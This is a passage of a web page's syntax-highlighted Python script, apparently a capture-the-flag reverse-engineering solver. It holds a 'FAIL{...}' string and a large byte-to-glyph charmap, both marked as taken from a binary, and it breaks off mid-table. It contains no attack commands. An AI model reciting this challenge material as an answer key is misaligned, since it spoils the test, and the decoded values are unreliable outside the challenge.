class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments">#!/usr/bin/python</code></div><div class="line number2 index1 alt1"><code class="python plain">srctext</code><code class="python keyword">=</code><code class="python string">"FAIL{tX1NJfGxnatFxY63Wxmlpxh12Z0h5xeGxaH56Nfy}"</code>&nbsp;<code class="python comments">#get&nbsp;from&nbsp;bin</code></div><div class="line number3 index2 alt2"><code class="python plain">charmap</code><code class="python keyword">=</code><code class="python plain">{&nbsp;</code><code class="python comments">#&nbsp;get&nbsp;charmap&nbsp;from&nbsp;bin</code></div><div class="line number4 index3 alt1"><code class="python value">0xA9</code><code class="python plain">:[</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number5 index4 alt2"><code class="python value">0xAA</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">],&nbsp;</code></div><div class="line number6 index5 alt1"><code class="python value">0xAB</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">],&nbsp;</code></div><div class="line number7 index6 alt2"><code class="python value">0xAC</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">],&nbsp;</code></div><div class="line number8 index7 alt1"><code class="python value">0xAD</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">],&nbsp;</code></div><div class="line number9 index8 alt2"><code class="python value">0xAE</code><code class="python plain">:[</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x06</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number10 index9 alt1"><code class="python value">0xAF</code><code class="python plain">:[</code><code class="python value">0x53</code><code class="python plain">,&nbsp;</code><code class="python value">0x53</code><code class="python plain">,&nbsp;</code><code class="python value">0x53</code><code class="python plain">,&nbsp;</code><code class="python value">0x53</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">],&nbsp;</code></div><div class="line number11 index10 alt2"><code class="python value">0xA0</code><code class="python plain">:[</code><code class="python value">0x12</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number12 index11 alt1"><code class="python value">0xA1</code><code class="python plain">:[</code><code class="python value">0x16</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x57</code><code class="python plain">],&nbsp;</code></div><div class="line number13 index12 alt2"><code class="python value">0xA8</code><code class="python plain">:[</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x57</code><code class="python plain">],&nbsp;</code></div><div class="line number14 index13 alt1"><code class="python value">0xF9</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">],&nbsp;</code></div><div class="line number15 index14 alt2"><code class="python value">0xFA</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x56</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">],&nbsp;</code></div><div class="line number16 index15 alt1"><code class="python value">0xFB</code><code class="python plain">:[</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number17 index16 alt2"><code class="python value">0xFC</code><code class="python plain">:[</code><code class="python value">0x13</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">],&nbsp;</code></div><div class="line number18 index17 alt1"><code class="python value">0xFD</code><code class="python plain">:[</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x06</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number19 index18 alt2"><code class="python value">0xFE</code><code class="python plain">:[</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number20 index19 alt1"><code class="python value">0xFF</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x53</code><code class="python plain">,&nbsp;</code><code class="python value">0x06</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x16</code><code class="python plain">],&nbsp;</code></div><div class="line number21 index20 alt2"><code class="python value">0xF0</code><code class="python plain">:[</code><code class="python value">0x56</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x16</code><code class="python plain">],&nbsp;</code></div><div class="line number22 index21 alt1"><code class="python value">0xF1</code><code class="python plain">:[</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x06</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x56</code><code class="python plain">],&nbsp;</code></div><div class="line number23 index22 alt2"><code class="python value">0xF2</code><code class="python plain">:[</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number24 index23 alt1"><code class="python value">0xF3</code><code class="python plain">:[</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x50</code><code class="python plain">,&nbsp;</code><code class="python value">0x16</code><code class="python plain">],&nbsp;</code></div><div class="line number25 index24 alt2"><code class="python value">0xF4</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x53</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">],&nbsp;</code></div><div class="line number26 index25 alt1"><code class="python value">0xF5</code><code class="python plain">:[</code><code class="python value">0x56</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x56</code><code class="python plain">],&nbsp;</code></div><div class="line number27 index26 alt2"><code class="python value">0xF6</code><code class="python plain">:[</code><code class="python value">0x56</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x17</code><code class="python plain">],&nbsp;</code></div><div class="line number28 index27 alt1"><code class="python value">0xF7</code><code class="python plain">:[</code><code class="python value">0x17</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x06</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x17</code><code class="python plain">],&nbsp;</code></div><div class="line number29 index28 alt2"><code class="python value">0xE8</code><code class="python plain">:[</code><code class="python value">0x57</code><code class="python plain">,&nbsp;</code><code class="python value">0x50</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">],&nbsp;</code></div><div class="line number30 index29 alt1"><code class="python value">0xE9</code><code class="python plain">:[</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x16</code><code class="python plain">],&nbsp;</code></div><div class="line number31 index30 alt2"><code class="python value">0xEA</code><code class="python plain">:[</code><code class="python value">0x53</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x07</code><code class="python plain">,&nbsp;</code><code class="python value">0x07</code><code class="python plain">,&nbsp;</code><code class="python value">0x43</code><code class="python plain">,&nbsp;</code><code class="python value">0x43</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x17</code><code class="python plain">],&nbsp;</code></div><div class="line number32 index31 alt1"><code class="python value">0xEB</code><code class="python plain">:[</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x50</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x41</code><code class="python plain">],&nbsp;</code></div><div class="line number33 index32 alt2"><code class="python value">0xEC</code><code class="python plain">:[</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x13</code><code class="python plain">],&nbsp;</code></div><div class="line number34 index33 alt1"><code class="python value">0xED</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x56</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x16</code><code class="python plain">],&nbsp;</code></div><div class="line number35 index34 alt2"><code class="python value">0xEE</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x40</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">],&nbsp;</code></div><div class="line number36 index35 alt1"><code class="python value">0xEF</code><code class="python plain">:[</code><code class="python value">0x45</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x51</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">],&nbsp;</code></div><div class="line number37 index36 alt2"><code class="python value">0xE0</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x57</code><code class="python plain">],&nbsp;</code></div><div class="line number38 index37 alt1"><code class="python value">0xE1</code><code class="python plain">:[</code><code class="python value">0x56</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x56</code><code class="python plain">],&nbsp;</code></div><div class="line number39 index38 alt2"><code class="python value">0xE2</code><code class="python plain">:[</code><code class="python value">0x57</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x57</code><code class="python plain">],&nbsp;</code></div><div class="line number40 index39 alt1"><code class="python value">0xD9</code><code class="python plain">:[</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number41 index40 alt2"><code class="python value">0xDA</code><code class="python plain">:[</code><code class="python value">0x12</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x43</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x17</code><code class="python plain">],&nbsp;</code></div><div class="line number42 index41 alt1"><code class="python value">0xDB</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">],&nbsp;</code></div><div class="line number43 index42 alt2"><code class="python value">0xDC</code><code class="python plain">:[</code><code class="python value">0x13</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x13</code><code class="python plain">],&nbsp;</code></div><div class="line number44 index43 alt1"><code class="python value">0xDD</code><code class="python plain">:[</code><code class="python value">0x13</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">],&nbsp;</code></div><div class="line number45 index44 alt2"><code class="python value">0xDE</code><code class="python plain">:[</code><code class="python value">0x16</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x57</code><code class="python plain">],&nbsp;</code></div><div class="line number46 index45 alt1"><code class="python value">0xDF</code><code class="python plain">:[</code><code class="python value">0x57</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x56</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number47 index46 alt2"><code class="python value">0xD0</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x53</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x53</code><code class="python plain">],&nbsp;</code></div><div class="line number48 index47 alt1"><code class="python value">0xD1</code><code class="python plain">:[</code><code class="python value">0x57</code><code class="python plain">,&nbsp;</code><code class="python value">0x15</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number49 index48 alt2"><code class="python value">0xD2</code><code class="python plain">:[</code><code class="python value">0x12</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x17</code><code class="python plain">],&nbsp;</code></div><div class="line number50 index49 alt1"><code class="python value">0xD3</code><code class="python plain">:[</code><code class="python value">0x53</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number51 index50 alt2"><code class="python value">0xD4</code><code class="python plain">:[</code><code class="python value">0x57</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x02</code><code class="python plain">,&nbsp;</code><code class="python value">0x16</code><code class="python plain">],&nbsp;</code></div><div class="line number52 index51 alt1"><code class="python value">0xD5</code><code class="python plain">:[</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x47</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number53 index52 alt2"><code class="python value">0xD6</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x41</code><code class="python plain">],&nbsp;</code></div><div class="line number54 index53 alt1"><code class="python value">0xD7</code><code class="python plain">:[</code><code class="python value">0x46</code><code class="python plain">,&nbsp;</code><code class="python value">0x50</code><code class="python plain">,&nbsp;</code><code class="python value">0x10</code><code class="python plain">,&nbsp;</code><code class="python value">0x56</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x11</code><code class="python plain">,&nbsp;</code><code class="python value">0x46</code><code class="python plain">],&nbsp;</code></div><div class="line number55 index54 alt2"><code class="python value">0xC8</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x45</code><code class="python plain">,&nbsp;</code><code class="python value">0x01</code><code class="python plain">,&nbsp;</code><code class="python value">0x41</code><code class="python plain">],&nbsp;</code></div><div class="line number56 index55 alt1"><code class="python value">0xC9</code><code class="python plain">:[</code><code class="python value">0x00</code><code class="python plain">,&nbsp;</code><code class="python value">0x17</code><code class="python plain">,&nbsp;</code><code class="python value">0x03</code><code class="python plain">,&nbsp;</code><code class="python value">0x42</code><code class="python plain">,&nbsp;</code><code class="python value">0x44</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x04</code><code class="python plain">,&nbsp;</code><code class="python value">0x12</code><code class="python plain">],&nbsp;</code></div><div class="line number57 index56 alt2"><code class="python value">0xCA</code><code class="python plain">:[</code><code class="python 